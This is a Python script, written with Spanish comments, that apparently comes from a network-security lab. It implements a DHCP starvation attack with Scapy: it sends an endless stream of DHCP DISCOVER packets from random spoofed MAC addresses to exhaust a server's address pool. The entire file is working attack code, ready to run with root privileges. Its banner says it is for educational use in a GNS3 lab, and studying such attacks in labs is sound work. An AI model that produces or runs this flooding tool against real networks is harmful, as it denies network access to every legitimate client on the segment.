from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, RandInt, conf
import time

def dhcp_starvation(interface):
    print(f"[*] Iniciando ataque DHCP Starvation en: {interface}")
    print("[!] Presiona Ctrl+C para detener el ataque\n")
    
    # Desactivar el chequeo de respuestas
    conf.checkIPaddr = False
    conf.verb = 0  # Desactivar verbosidad de Scapy
    
    packet_count = 0
    
    try:
        while True:
            # Generar una MAC aleatoria (convertir a string)
            bogus_mac = str(RandMAC())
            
            # Construir el paquete DHCP DISCOVER
            # Layer 2: Ethernet (Broadcast)
            ether = Ether(src=bogus_mac, dst="ff:ff:ff:ff:ff:ff")
            
            # Layer 3: IP
            ip = IP(src="0.0.0.0", dst="255.255.255.255")
            
            # Layer 4: UDP (Puertos estándar DHCP: cliente=68, servidor=67)
            udp = UDP(sport=68, dport=67)
            
            # BOOTP/DHCP Payload
            # xid debe ser aleatorio para cada request
            bootp = BOOTP(
                chaddr=bogus_mac,  # Cliente MAC address
                xid=RandInt()      # Transaction ID aleatorio
            )
            
            # DHCP DISCOVER
            dhcp = DHCP(options=[
                ("message-type", "discover"),
                ("hostname", f"victim-{packet_count}"),  # Opcional
                "end"
            ])
            
            # Ensamblar paquete completo
            packet = ether / ip / udp / bootp / dhcp
            
            # Enviar el paquete
            sendp(packet, iface=interface, verbose=False)
            
            packet_count += 1
            
            # Mostrar progreso cada 100 paquetes
            if packet_count % 100 == 0:
                print(f"[+] Paquetes DHCP DISCOVER enviados: {packet_count}")
            
            # Pequeño delay opcional (comentar para máxima velocidad)
            # time.sleep(0.001)  # 1ms entre paquetes
            
    except KeyboardInterrupt:
        print(f"\n[*] Ataque detenido.")
        print(f"[*] Total de paquetes enviados: {packet_count}")
    except PermissionError:
        print("[!] ERROR: Se requieren privilegios de root/administrador")
        print("[!] Ejecuta el script con: sudo python3 dhcp_starvation.py")
    except Exception as e:
        print(f"[!] Error inesperado: {e}")

if __name__ == "__main__":
    import sys
    
    # Verificar argumentos
    if len(sys.argv) > 1:
        interfaz_objetivo = sys.argv[1]
    else:
        interfaz_objetivo = "eth1"  # ← CONFIGURADO PARA eth1
    
    print("=" * 60)
    print("DHCP Starvation Attack - Solo para uso educativo en GNS3")
    print("=" * 60)
    
    dhcp_starvation(interfaz_objetivo)